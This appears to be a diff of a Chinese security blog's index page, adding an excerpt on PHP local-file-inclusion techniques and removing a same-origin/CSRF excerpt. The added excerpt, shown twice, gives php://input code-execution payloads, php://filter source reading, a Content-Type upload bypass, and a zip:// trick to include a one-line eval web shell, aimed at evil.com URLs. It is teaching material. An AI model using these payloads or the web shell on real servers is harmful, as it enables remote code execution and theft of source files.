@@ -117,6 +117,146 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2016/12/28/php的zip伪协议.html" >php://input&amp;&amp;php://filter</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2016-12-28  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>php://input需要服务器的支持，同时要求”allow_url_include”设置为On，在PHP的配置文件php.ini配置。对于一个LFI产生的漏洞比如：</p>
+<pre class="line-numbers language-none"><code class="language-none">index.php:
+
+&lt;?php
+    $b&#x3D;$_REQUEST[&quot;b&quot;];
+    @include($b);
+ ?&gt;
+ 
+EXP:
+
+GET http:&#x2F;&#x2F;evil.com&#x2F;index.php?php:&#x2F;&#x2F;input
+&lt;?php system(&quot;id&quot;)?&gt;
+
+获取文件内容：
+&lt;?php echo file_get_contents(&quot;info.php&quot;);?&gt; &#x2F;&#x2F;测试可用
+&lt;?php echo base64_encode(file_get_contents(&quot;info.php&quot;));?&gt;  &#x2F;&#x2F;http:&#x2F;&#x2F;www.cnblogs.com&#x2F;LittleHann&#x2F;p&#x2F;3665062.html 防止获取&#96;.php&#96;文件的时候php执行，先base64编码下，但是实际测试上述即可用。php在4点多的版本使用这个可以读出来
+
+
+fimap.py 类似sqlmap.py，用来文件包含扫描，可以获取一个交互shell
+另外一个php伪协议：
+ 
+file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;image.php
+用来读取php文件。
+ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>$_FILES[“file”][“type”]</code><br>这个参数是浏览器生成传递给服务端的，虽然不是用户输入数据，但是是属于客户端传递过来的数据，也就是用户其实是可以控制这个参数的。只需要修改Content-Type: image/jpeg 就可以绕过这个检查，上传任意类型的文件。</p>
+<h3 id="php的zip伪协议"><a href="#php的zip伪协议" class="headerlink" title="php的zip伪协议"></a>php的zip伪协议</h3><p>假设有以下的代码：</p>
+<pre class="line-numbers language-none"><code class="language-none">file.php:
+
+&lt;?php
+@include($_GET[&#39;a&#39;].&quot;.jpg&quot;);
+@include($_GET[&#39;b&#39;].&quot;.php&quot;);
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>明细的包含，对于参数a和参数b可以这样来解决，比如有一个</p>
+<pre class="line-numbers language-none"><code class="language-none">shell.php:
+
+&lt;?php eval($_GET[&#39;c&#39;]);?&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>a参数最终包含的是一个jpg，b参数是一个php</p>
+<pre class="line-numbers language-none"><code class="language-none">对于a来说：
+mv shell.php shell.jpg
+zip a.zip shell.jpg
+
+访问: http:&#x2F;&#x2F;evil.com&#x2F;file.php?a&#x3D;zip:&#x2F;&#x2F;a.zip%23shell&amp;c&#x3D;phpinfo();
+
+对于b来说：
+zip b.zip shell.php
+
+访问: http:&#x2F;&#x2F;evil.com&#x2F;file.php?b&#x3D;zip:&#x2F;&#x2F;b.zip%23shell&amp;c&#x3D;phpinfo();
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2016/12/28/php的zip伪协议.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>php://input需要服务器的支持，同时要求”allow_url_include”设置为On，在PHP的配置文件php.ini配置。对于一个LFI产生的漏洞比如：</p>
+<pre class="line-numbers language-none"><code class="language-none">index.php:
+
+&lt;?php
+    $b&#x3D;$_REQUEST[&quot;b&quot;];
+    @include($b);
+ ?&gt;
+ 
+EXP:
+
+GET http:&#x2F;&#x2F;evil.com&#x2F;index.php?php:&#x2F;&#x2F;input
+&lt;?php system(&quot;id&quot;)?&gt;
+
+获取文件内容：
+&lt;?php echo file_get_contents(&quot;info.php&quot;);?&gt; &#x2F;&#x2F;测试可用
+&lt;?php echo base64_encode(file_get_contents(&quot;info.php&quot;));?&gt;  &#x2F;&#x2F;http:&#x2F;&#x2F;www.cnblogs.com&#x2F;LittleHann&#x2F;p&#x2F;3665062.html 防止获取&#96;.php&#96;文件的时候php执行，先base64编码下，但是实际测试上述即可用。php在4点多的版本使用这个可以读出来
+
+
+fimap.py 类似sqlmap.py，用来文件包含扫描，可以获取一个交互shell
+另外一个php伪协议：
+ 
+file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;image.php
+用来读取php文件。
+ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>$_FILES[“file”][“type”]</code><br>这个参数是浏览器生成传递给服务端的，虽然不是用户输入数据，但是是属于客户端传递过来的数据，也就是用户其实是可以控制这个参数的。只需要修改Content-Type: image/jpeg 就可以绕过这个检查，上传任意类型的文件。</p>
+<h3 id="php的zip伪协议"><a href="#php的zip伪协议" class="headerlink" title="php的zip伪协议"></a>php的zip伪协议</h3><p>假设有以下的代码：</p>
+<pre class="line-numbers language-none"><code class="language-none">file.php:
+
+&lt;?php
+@include($_GET[&#39;a&#39;].&quot;.jpg&quot;);
+@include($_GET[&#39;b&#39;].&quot;.php&quot;);
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>明细的包含，对于参数a和参数b可以这样来解决，比如有一个</p>
+<pre class="line-numbers language-none"><code class="language-none">shell.php:
+
+&lt;?php eval($_GET[&#39;c&#39;]);?&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>a参数最终包含的是一个jpg，b参数是一个php</p>
+<pre class="line-numbers language-none"><code class="language-none">对于a来说：
+mv shell.php shell.jpg
+zip a.zip shell.jpg
+
+访问: http:&#x2F;&#x2F;evil.com&#x2F;file.php?a&#x3D;zip:&#x2F;&#x2F;a.zip%23shell&amp;c&#x3D;phpinfo();
+
+对于b来说：
+zip b.zip shell.php
+
+访问: http:&#x2F;&#x2F;evil.com&#x2F;file.php?b&#x3D;zip:&#x2F;&#x2F;b.zip%23shell&amp;c&#x3D;phpinfo();
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2016/12/28/php的zip伪协议.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2016/11/08/sql-proxy.html" >Sql代理注入</a>
 		</h3>
 		</div>
@@ -565,98 +705,6 @@ quit
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2016/08/29/csrf.html" >CSRF</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2016-08-29  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>同源策略(Same Origin policy, SOP)，也称为单源策略(Single Origin policy)，用于Web浏览器编程语言的安全措施，用以保护信息的保密性和安全性。同源策略防止网站脚本访问其他站点使用脚本，也组织它与其他站点交互。<br>只要<strong>协议</strong>、<strong>端口</strong>、<strong>主机</strong>三个有一个不匹配，就是跨域请求。</p>
-<p>如果要跨域请求，有下面的限制：</p>
-<ul>
-<li>仅允许GET、HEAD、POST请求</li>
-<li>仅允许手动设置Accept、Accept-Language、Content-Language和Content-Type头</li>
-<li>Content-Type头仅允许使用application/x-www-form-urlencoded,multipart/form-data和text/plain这三种值。</li>
-</ul>
-<p>满足以上三个请求的，称为simple request<br>当上门的simple request不能满足使用场景的时候，有以下的请求解决跨域限制，都是以<code>Access-Control-</code>开头，比较重要的有：</p>
-<ul>
-<li>Access-Control-Allow-Origin：限制这个请求能从哪些URI访问。</li>
-</ul>
-<blockquote>
-<p>在使用这个请求，使用AJAX时，被调用方需要输出这个头，指名可以从哪个网站 访问，如果未输出这个头，只允许同域名的访问。</p>
-</blockquote>
-<ul>
-<li>Access-Control-Allow-Credentials: 允许这个请求使用cookie。</li>
-</ul>
-<blockquote>
-<p>一般跨域情况下，AJAX不会附带用户的Cookie，也不允许设置用户的Cookie，要使用这个的话，首先C在构造这个XMLHTTPRequest对象时，需要设置withCredentials属性。</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">XMLHttpRequest:
-
-var xhr &#x3D; new XMLHttpRequest();
-xhr.open(&#39;GET&#39;, url, true);
-xhr.withCredentials &#x3D; true;
-xhr.onreadystatechange &#x3D; handler;
-xhr.send()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-
-	</div>
-  <a type="button" href="/2016/08/29/csrf.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>同源策略(Same Origin policy, SOP)，也称为单源策略(Single Origin policy)，用于Web浏览器编程语言的安全措施，用以保护信息的保密性和安全性。同源策略防止网站脚本访问其他站点使用脚本，也组织它与其他站点交互。<br>只要<strong>协议</strong>、<strong>端口</strong>、<strong>主机</strong>三个有一个不匹配，就是跨域请求。</p>
-<p>如果要跨域请求，有下面的限制：</p>
-<ul>
-<li>仅允许GET、HEAD、POST请求</li>
-<li>仅允许手动设置Accept、Accept-Language、Content-Language和Content-Type头</li>
-<li>Content-Type头仅允许使用application/x-www-form-urlencoded,multipart/form-data和text/plain这三种值。</li>
-</ul>
-<p>满足以上三个请求的，称为simple request<br>当上门的simple request不能满足使用场景的时候，有以下的请求解决跨域限制，都是以<code>Access-Control-</code>开头，比较重要的有：</p>
-<ul>
-<li>Access-Control-Allow-Origin：限制这个请求能从哪些URI访问。</li>
-</ul>
-<blockquote>
-<p>在使用这个请求，使用AJAX时，被调用方需要输出这个头，指名可以从哪个网站 访问，如果未输出这个头，只允许同域名的访问。</p>
-</blockquote>
-<ul>
-<li>Access-Control-Allow-Credentials: 允许这个请求使用cookie。</li>
-</ul>
-<blockquote>
-<p>一般跨域情况下，AJAX不会附带用户的Cookie，也不允许设置用户的Cookie，要使用这个的话，首先C在构造这个XMLHTTPRequest对象时，需要设置withCredentials属性。</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">XMLHttpRequest:
-
-var xhr &#x3D; new XMLHttpRequest();
-xhr.open(&#39;GET&#39;, url, true);
-xhr.withCredentials &#x3D; true;
-xhr.onreadystatechange &#x3D; handler;
-xhr.send()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2016/08/29/csrf.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -714,7 +762,7 @@ xhr.send()<span aria-hidden="true" class="line-numbers-rows"><span></span><span>
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>52</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>53</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -735,6 +783,10 @@ xhr.send()<span aria-hidden="true" class="line-numbers-rows"><span></span><span>
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/05/26/cobaltstrike-learn.html" ><i class="fa fa-file-o"></i>CobaltStrike通信学习笔记</a>
+      </li>
+    
+      <li>
         <a href="/2023/05/10/pay_vuln.html" ><i class="fa fa-file-o"></i>支付接口安全测试记录</a>
       </li>
     
@@ -748,10 +800,6 @@ xhr.send()<span aria-hidden="true" class="line-numbers-rows"><span></span><span>
     
       <li>
         <a href="/2023/03/27/pinfish-and-osx-pentest.html" ><i class="fa fa-file-o"></i>记一次钓鱼演练和OS X下的渗透技巧</a>
-      </li>
-    
-      <li>
-        <a href="/2023/03/03/github-trick.html" ><i class="fa fa-file-o"></i>Github搜索小技巧</a>
       </li>
     
   </ul>
